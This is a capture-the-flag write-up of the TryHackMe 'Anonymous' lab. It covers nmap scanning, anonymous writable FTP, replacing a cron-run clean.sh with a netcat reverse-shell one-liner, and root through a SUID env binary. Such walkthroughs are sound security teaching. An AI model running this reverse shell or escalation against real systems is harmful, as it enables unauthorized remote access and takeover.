# TryHackMe: Anonymous

[Anonymous](https://tryhackme.com/room/anonymous) is a medium rated room on TryHackMe but even after that it took only 2 major steps to get the `root`. The room focuses mainly on enumerating the services running on the machine.

So, let's begin!

## Enumeration

As a part of the initial enumeration regime, we can first try to access the machine's IP in our browser to check if some website is hosted on port 80/443. But turns out that nothing is hosted over there. The second things that we can do is run an `nmap` scan to check the open ports and what services are running over there.

```bash
┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]
└─$ nmap -p- -T4 10.10.0.150 | tee open_ports      
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-24 09:58 EDT
Warning: 10.10.0.150 giving up on port because retransmission cap hit (6).
Stats: 0:14:58 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 87.95% done; ETC: 10:15 (0:02:03 remaining)
Nmap scan report for 10.10.0.150
Host is up (0.15s latency).
Not shown: 65441 closed ports, 90 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 1049.08 seconds
┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]
└─$ sudo nmap -sS -sV -A -O -p21,22,139,445 10.10.0.150 | tee port_details                        130 ⨯

Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-24 10:28 EDT
Nmap scan report for 10.10.0.150
Host is up (0.16s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.91.135
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2021-04-24T14:28:57+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-24T14:28:58
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   166.05 ms 10.8.0.1
2   167.04 ms 10.10.0.150

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.46 seconds
```

So, it can be seen that 4 ports are open on the machine which are 21, 22, 139 and 445. Also, it can be seen that `anonymous` access is enabled over FTP that too with write access. So, we can check what files can be accessed over there.

```bash
┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]
└─$ ftp 10.10.123.180
Connected to 10.10.123.180.
220 NamelessOne's FTP Server!
Name (10.10.123.180:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 May 13  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000          860 Jun 04  2020 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

It can be seen that within the directory named `scripts` there are 3 files. We can download all of them and check their content. Also, from the permissions of the files it can be seen that for file `clean.sh` we have all the read, write and execute permissions set.

```bash
ftp> mget *
mget clean.sh? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for clean.sh (314 bytes).
226 Transfer complete.
314 bytes received in 0.00 secs (96.0955 kB/s)
mget removed_files.log? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for removed_files.log (903 bytes).
226 Transfer complete.
903 bytes received in 0.00 secs (604.8257 kB/s)
mget to_do.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.08 secs (0.8309 kB/s)
ftp> exit
221 Goodbye.
```

Now that we have downloaded all the files, we can take a look at each one of them.

```bash
┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]
└─$ cat clean.sh       
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

It appears that the bash script `clean.sh` is trying to delete files in the `/tmp` directory and print the output of its actions in the another file named as `removed_files.log`.

As we have access to the `removed_files.log` as well, we can check out its content as well.

```bash
┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]
└─$ cat removed_files.log 
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```

Nothing interesting can be found in this log file. But one thing that can be inferred from the content of this file is that the `clean.sh` script is being run at fixed intervals which is why we can see multiple entries of "nothing to delete" in the log file. Also, we have one more file `to_do.txt`.

```bash
┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]
└─$ cat to_do.txt        
I really need to disable the anonymous login...it's really not safe
```

For this file all that we can say is that **"its too late to realize!"**

From all the 3 files, `clean.sh` appears to be most useful for gaining access to the system.

## Initial Foothold

As we have write access to the `clean.sh` bash script and also that we have a downloaded copy of the same script, we can edit the bash script to run a command that would help us gain a reverse shell on the system. After editing the bash script, we can again upload it on the FTP server as we have write access as well (from the `nmap` results).

```bash
┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]
└─$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.91.135 4444 >/tmp/f" > clean.sh 
                                                                                                        
┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]
└─$ cat clean.sh     
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.91.135 4444 >/tmp/f

┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]
└─$ ftp 10.10.139.154
Connected to 10.10.139.154.
220 NamelessOne's FTP Server!
Name (10.10.139.154:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd scripts
250 Directory successfully changed.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000          903 Apr 24 17:38 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> put clean.sh
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
140 bytes sent in 0.00 secs (2.7248 MB/s)
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          140 Apr 24 17:38 clean.sh
-rw-rw-r--    1 1000     1000          903 Apr 24 17:38 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> exit
```

> **Note:** Directly `put` the bash script on the server without deleting the copy on the server as it will retain the original permissions of the script else the newly uploaded script would get uploaded with permissions like: `-rw-r--r--` and because of which won't get executed as expected as the `x` would be disabled. Also, as we have logged in as "anonymous" user we can't perform `chmod` to make it executable.

Now, that our modified bash script is uploaded, all we need to do is start a listener on our local machine using the command: `nc -nvlp 4444` and wait for the connection to open up.

After a few seconds, we do get our reverse shell:

```bash
┌──(kali㉿kali)-[~/Desktop/oscp/anonymous]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.8.91.135] from (UNKNOWN) [10.10.115.25] 60948
sh: 0: can't access tty; job control turned off
$ 
```

The issue here is that this is a `dumb` shell and to improve it an interactive shell we can use [python-pty-shells](https://github.com/infodox/python-pty-shells).

Checkout the guide on how to get a fully interactive TTY using using "python-pty-shells" over [here](https://0xnirvana.medium.com/gaining-interactive-reverse-shell-w-python-a4bd490735a8).

Now that we have a fully interactive shell, we can read the user's flag.

```bash
namelessone@anonymous:~$ ls -la
total 64
drwxr-xr-x 6 namelessone namelessone 4096 Apr 24 19:33 .
drwxr-xr-x 3 root        root        4096 May 11  2020 ..
lrwxrwxrwx 1 root        root           9 May 11  2020 .bash_history -> /dev/null
-rw-r--r-- 1 namelessone namelessone  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 namelessone namelessone 3771 Apr  4  2018 .bashrc
drwx------ 2 namelessone namelessone 4096 May 11  2020 .cache
drwx------ 3 namelessone namelessone 4096 May 11  2020 .gnupg
-rw------- 1 namelessone namelessone   36 May 12  2020 .lesshst
drwxrwxr-x 3 namelessone namelessone 4096 May 12  2020 .local
drwxr-xr-x 2 namelessone namelessone 4096 May 17  2020 pics
-rw-r--r-- 1 namelessone namelessone  807 Apr  4  2018 .profile
-rw-rw-r-- 1 namelessone namelessone   66 May 12  2020 .selected_editor
-rw-r--r-- 1 namelessone namelessone    0 May 12  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 namelessone namelessone  688 Apr 23 11:30 tcp_pty_backconnect.py
-rw-r--r-- 1 namelessone namelessone   33 May 11  2020 user.txt
-rw------- 1 namelessone namelessone 7994 May 12  2020 .viminfo
-rw-rw-r-- 1 namelessone namelessone  215 May 13  2020 .wget-hsts
namelessone@anonymous:~$ cat user.txt 	
```

Our next task is to get `root` privileges.

## Privilege Escalation

The first thing that we can look for is the output of `sudo -l` command but as we don't know the password of the current user we can retrieve those results. The next thing that we can look for are the cron jobs.

```bash
namelessone@anonymous:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

```

But again, over here also we can't find any useful information. We can also take a look at the files on the system that have SUID/SGID bit set.

```bash
namelessone@anonymous:~$ find / -perm -4000 -exec ls -la {} \; 2> /dev/null 
-rwsr-xr-x 1 root root 40152 Oct 10  2019 /snap/core/8268/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/8268/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/8268/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/8268/bin/su
-rwsr-xr-x 1 root root 27608 Oct 10  2019 /snap/core/8268/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/8268/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/8268/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/8268/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/8268/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Oct 11  2019 /snap/core/8268/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 106696 Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/8268/usr/sbin/pppd
-rwsr-xr-x 1 root root 40152 Jan 27  2020 /snap/core/9066/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/9066/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/9066/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/9066/bin/su
-rwsr-xr-x 1 root root 27608 Jan 27  2020 /snap/core/9066/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/9066/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/9066/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/9066/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/9066/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/9066/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jan 31  2020 /snap/core/9066/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Nov 29  2019 /snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/9066/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 110792 Apr 10  2020 /snap/core/9066/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Feb 11  2020 /snap/core/9066/usr/sbin/pppd
-rwsr-xr-x 1 root root 26696 Mar  5  2020 /bin/umount
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 43088 Mar  5  2020 /bin/mount
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root root 109432 Oct 30  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 35000 Jan 18  2018 /usr/bin/env
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 149080 Jan 31  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec

```

From all the se files, first we can look for binaries that can be exploited using [GTFOBins](https://gtfobins.github.io/). And one such binary appears to be `/usr/bin/env`, 

We can go ahead and search for `env` at GTFOBins and run the command provided there to gain a root masam:

```bash
namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
# whoami
root
# id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
# cd /root
# cat root.txt

```

 And there we get the root flag for this machine!



## References

1. TryHackMe - Anonymous: https://tryhackme.com/room/anonymous
2. python-pty-shells: https://github.com/infodox/python-pty-shells
3. Creating Shells using python-pty-shells
4. GTFOBins: https://gtfobins.github.io

